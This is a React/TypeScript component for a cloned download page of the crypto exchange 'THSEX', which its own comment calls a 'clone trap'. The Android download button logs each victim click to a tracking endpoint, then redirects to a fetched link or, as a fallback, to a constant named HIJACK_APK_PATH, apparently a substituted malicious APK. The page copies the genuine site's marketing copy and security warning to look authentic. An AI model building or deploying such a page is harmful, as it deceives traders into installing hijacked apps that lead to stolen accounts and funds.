"use client";

import { HIJACK_APK_PATH } from "@/lib/config";

type ApiRow = { type?: string; url?: string };

async function logHit(action: string) {
  try {
    await fetch("/api/hit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action }),
    });
  } catch {
    /* silent */
  }
}

/** Standalone clone trap (no iframe) — backup if iframe blocked */
export default function DownAppClone() {
  async function handleAndroidDownload() {
    try {
      const res = await fetch("/api/proxy/downloadlink", { cache: "no-store" });
      const json = await res.json();
      const rows: ApiRow[] = Array.isArray(json.data) ? json.data : [];
      const android = rows.find((r) => String(r.type || "").toLowerCase().includes("android"));
      await logHit("clone_download_click");
      window.location.href = android?.url || HIJACK_APK_PATH;
    } catch {
      await logHit("clone_download_fallback");
      window.location.href = HIJACK_APK_PATH;
    }
  }

  return (
    <div className="downapp-page">
      <header className="downapp-nav">THSEX</header>

      <section className="downapp-hero">
        <h1>
          Digital asset trading -
          <br />
          <span>start trading</span>
        </h1>
        <p>
          Install now and start trading immediately. Secure, fast, and built for mobile traders.
        </p>
        <div className="downapp-hero-img">
          <div className="downapp-phone">
            <div className="downapp-phone-screen">THSEX</div>
          </div>
        </div>
      </section>

      <section className="downapp-card">
        <button
          type="button"
          className="downapp-btn"
          onClick={handleAndroidDownload}
          aria-label="Download Android APK"
        >
          <img
            src="/assets/icon_downapp.png"
            alt="Download on the Android APK"
            onError={(e) => {
              const img = e.currentTarget;
              img.style.display = "none";
              const fb = img.nextElementSibling as HTMLElement | null;
              if (fb) fb.style.display = "block";
            }}
          />
          <span className="downapp-btn-fallback">Download on the Android APK</span>
        </button>

        <button type="button" className="downapp-btn downapp-btn-disabled" disabled>
          <img
            src="/assets/download.png"
            alt="Download on the App Store"
            onError={(e) => {
              e.currentTarget.style.display = "none";
            }}
          />
        </button>
      </section>

      <p className="downapp-install">
        Install now, <span>start trading</span>
        <br />
        Please do not disclose your password, SMS code, or Google verification code to anyone.
      </p>
    </div>
  );
}
